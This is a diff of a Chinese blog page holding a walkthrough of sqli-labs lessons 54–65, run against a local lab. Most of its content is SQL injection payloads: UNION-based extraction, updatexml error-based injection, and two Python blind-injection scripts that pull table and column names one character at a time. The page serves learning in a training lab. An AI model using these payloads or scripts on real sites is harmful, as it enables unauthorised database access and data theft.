@@ -272,7 +272,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>3.7k</span>
+              <span>3.6k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -292,88 +292,78 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="54"><a href="#54" class="headerlink" title="54"></a>54</h3><br>
-
-<p><code>id=0&#39; and 1=1 union select 1,2,3 --+</code></p>
-<br>
-
-<p><code>id=0&#39; and 1=1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),3 --+</code></p>
+        <h3 id="section">54</h3>
+<p><br></p>
+<p><code>id=0' and 1=1 union select 1,2,3 --+</code></p>
+<p><br></p>
+<p><code>id=0' and 1=1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),3 --+</code></p>
 <p>dbs challenges</p>
 <p>table qpu4f7zhcb</p>
-<p>columns  sessid,secret_6KIK,tryy</p>
-<br>
-
-<p><code>id=0&#39; and 1=1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;qpu4f7zhcb&#39;),3 --+</code></p>
-<br>
-
-<p>id=0’ and 1=1 union select 1,(select sessid from qpu4f7zhcb limit 0,1),(select secret_6KIK from qpu4f7zhcb limit 0,1)  –+</p>
-<br>
-
-<br>
-
-<h3 id="55"><a href="#55" class="headerlink" title="55"></a>55</h3><p><code>)</code>闭合 </p>
+<p>columns sessid,secret_6KIK,tryy</p>
+<p><br></p>
+<p><code>id=0' and 1=1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='challenges' and table_name='qpu4f7zhcb'),3 --+</code></p>
+<p><br></p>
+<p>id=0' and 1=1 union select 1,(select sessid from qpu4f7zhcb limit
+0,1),(select secret_6KIK from qpu4f7zhcb limit 0,1) --+</p>
+<p><br></p>
+<p><br></p>
+<h3 id="section-1">55</h3>
+<p><code>)</code>闭合</p>
 <p><code>http://127.0.0.1/sqli-labs/Less-55/?id=0) union select 1,database(),3 --+</code></p>
-<p><code>?id=0) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),3--+</code></p>
-<p><code>?id=0) union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;8bgb8hj1sk&#39;),3 --+</code></p>
+<p><code>?id=0) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),3--+</code></p>
+<p><code>?id=0) union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='challenges' and table_name='8bgb8hj1sk'),3 --+</code></p>
 <p>secret_MCQ1</p>
 <p><code>id=0) union select 1,(select sessid from 8bgb8hj1sk limit 0,1),(select secret_MCQ1 from 8bgb8hj1sk limit 0,1)  --+</code></p>
-<br>
-
-<h3 id="56"><a href="#56" class="headerlink" title="56"></a>56</h3><p><code>&#39;)</code>闭合 方法还是一样的</p>
-<br>
-
-<h3 id="57"><a href="#57" class="headerlink" title="57"></a>57</h3><p><code>?id=-1&quot; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code></p>
-<br>
-
-<h3 id="58"><a href="#58" class="headerlink" title="58"></a>58</h3><p>使用<code>?id=1 and 1=1 union select 1,2,3</code>无回显</p>
+<p><br></p>
+<h3 id="section-2">56</h3>
+<p><code>')</code>闭合 方法还是一样的</p>
+<p><br></p>
+<h3 id="section-3">57</h3>
+<p><code>?id=-1" union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code></p>
+<p><br></p>
+<h3 id="section-4">58</h3>
+<p>使用<code>?id=1 and 1=1 union select 1,2,3</code>无回显</p>
 <p>尝试报错注入</p>
-<p><code>?id=0&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
-<p><code>?id=0&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</code></p>
-<p><code>?id=0&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;y0584eq2pg&#39;),0x7e),1)--+</code></p>
-<p><code>?id=0&#39; and updatexml(1,concat(0x7e,(select group_concat(secret_5U2L) from y0584eq2pg),0x7e),1)--+</code></p>
-<br>
-
-<h3 id="59"><a href="#59" class="headerlink" title="59"></a>59</h3><p>数字型 和58一样</p>
+<p><code>?id=0' and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
+<p><code>?id=0' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</code></p>
+<p><code>?id=0' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='y0584eq2pg'),0x7e),1)--+</code></p>
+<p><code>?id=0' and updatexml(1,concat(0x7e,(select group_concat(secret_5U2L) from y0584eq2pg),0x7e),1)--+</code></p>
+<p><br></p>
+<h3 id="section-5">59</h3>
+<p>数字型 和58一样</p>
 <p><code>?id=0 and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
-<br>
-
-<h3 id="60"><a href="#60" class="headerlink" title="60"></a>60</h3><p>用<code>&quot;)</code>闭合 和58一样</p>
-<br>
-
-<h3 id="61"><a href="#61" class="headerlink" title="61"></a>61</h3><p>用<code>&#39;))</code>闭合</p>
-<p><code>?id=0&#39;)) and updatexml(1,concat(0xs7e,database(),0x7e),1)--+</code></p>
-<br>
-
-<h3 id="62"><a href="#62" class="headerlink" title="62"></a>62</h3><p>用<code>&#39;)</code>闭合 这关没回显 使用时间盲注</p>
+<p><br></p>
+<h3 id="section-6">60</h3>
+<p>用<code>")</code>闭合 和58一样</p>
+<p><br></p>
+<h3 id="section-7">61</h3>
+<p>用<code>'))</code>闭合</p>
+<p><code>?id=0')) and updatexml(1,concat(0xs7e,database(),0x7e),1)--+</code></p>
+<p><br></p>
+<h3 id="section-8">62</h3>
+<p>用<code>')</code>闭合 这关没回显 使用时间盲注</p>
 <p>根据前面几关可以得到</p>
 <p>数据库为 challenges</p>
 <p>table 是随机10为字符组成</p>
-<p>column是secret_ 和四位随机字符组成 </p>
+<p>column是secret_ 和四位随机字符组成</p>
 <p>本关限制重置次数为130次，可以写个python脚本试一下</p>
-<br>
-
-<br>
-
-<p><code>?id=1&#39;) and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;m&#125;--+</code></p>
-<p><code>?id=1&#39;) and ascii(substr((select group_concat(column_name) from information_schema.tables where table_schema=database() and table_name=&#39;8mdr4weo2b&#39;),&#123;i&#125;,1))&gt;&#123;m&#125;--+</code></p>
-<br>
-
+<p><br></p>
+<p><br></p>
+<p><code>?id=1') and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;m&#125;--+</code></p>
+<p><code>?id=1') and ascii(substr((select group_concat(column_name) from information_schema.tables where table_schema=database() and table_name='8mdr4weo2b'),&#123;i&#125;,1))&gt;&#123;m&#125;--+</code></p>
+<p><br></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查表名</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/sqli-labs/Less-62/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">48</span>,<span class="number">58</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):  <span class="comment">#已知表长为10</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">61</span></span><br><span class="line">    <span class="keyword">while</span> high-low&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (high + low)//<span class="number">2</span></span><br><span class="line">        m = payloads[mid]           <span class="comment">#二分法判断</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27;) and ascii(substr((select group_concat(table_name) from &quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;information_schema.tables where table_schema=database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+&quot;</span></span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Angelina&#x27;</span> <span class="keyword">in</span> r.text:   <span class="comment">#Angelina是正常页面下的结果</span></span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += <span class="built_in">chr</span>(payloads[high])</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查字段</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/sqli-labs/Less-62/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">48</span>,<span class="number">58</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>))   </span><br><span class="line"></span><br><span class="line"><span class="comment"># 字段为secret_XXXX</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,<span class="number">12</span>):</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">61</span></span><br><span class="line">    <span class="keyword">while</span> high - low &gt; <span class="number">1</span>:</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line">        m = payloads[mid]  <span class="comment"># 二分法判断</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27;) and ascii(substr((select column_name from &quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;information_schema.columns where table_name=&#x27;eu3ls8m6rg&#x27; limit 2,1),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+&quot;</span></span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Angelina&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += <span class="built_in">chr</span>(payloads[high])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;secret_&#x27;</span>+data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="63"><a href="#63" class="headerlink" title="63"></a>63</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
-
+<h3 id="section-9">63</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 <p>方法同62</p>
-<br>
-
-<h3 id="64"><a href="#64" class="headerlink" title="64"></a>64</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=((<span class="subst">$id</span>)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
-
+<p><br></p>
+<h3 id="section-10">64</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=((<span class="subst">$id</span>)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 <p>方法同62</p>
-<br>
-
-<h3 id="65"><a href="#65" class="headerlink" title="65"></a>65</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
-
+<p><br></p>
+<h3 id="section-11">65</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 <p>方法同62</p>
 
     </div>
@@ -504,7 +494,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#54"><span class="nav-number">1.</span> <span class="nav-text">54</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#55"><span class="nav-number">2.</span> <span class="nav-text">55</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#56"><span class="nav-number">3.</span> <span class="nav-text">56</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#57"><span class="nav-number">4.</span> <span class="nav-text">57</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#58"><span class="nav-number">5.</span> <span class="nav-text">58</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#59"><span class="nav-number">6.</span> <span class="nav-text">59</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#60"><span class="nav-number">7.</span> <span class="nav-text">60</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#61"><span class="nav-number">8.</span> <span class="nav-text">61</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#62"><span class="nav-number">9.</span> <span class="nav-text">62</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#63"><span class="nav-number">10.</span> <span class="nav-text">63</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#64"><span class="nav-number">11.</span> <span class="nav-text">64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#65"><span class="nav-number">12.</span> <span class="nav-text">65</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#section"><span class="nav-number">1.</span> <span class="nav-text">54</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#section-1"><span class="nav-number">2.</span> <span class="nav-text">55</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#section-2"><span class="nav-number">3.</span> <span class="nav-text">56</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#section-3"><span class="nav-number">4.</span> <span class="nav-text">57</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#section-4"><span class="nav-number">5.</span> <span class="nav-text">58</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#section-5"><span class="nav-number">6.</span> <span class="nav-text">59</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#section-6"><span class="nav-number">7.</span> <span class="nav-text">60</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#section-7"><span class="nav-number">8.</span> <span class="nav-text">61</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#section-8"><span class="nav-number">9.</span> <span class="nav-text">62</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#section-9"><span class="nav-number">10.</span> <span class="nav-text">63</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#section-10"><span class="nav-number">11.</span> <span class="nav-text">64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#section-11"><span class="nav-number">12.</span> <span class="nav-text">65</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -520,7 +510,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -568,7 +558,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -582,7 +572,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -593,7 +583,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -733,6 +723,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
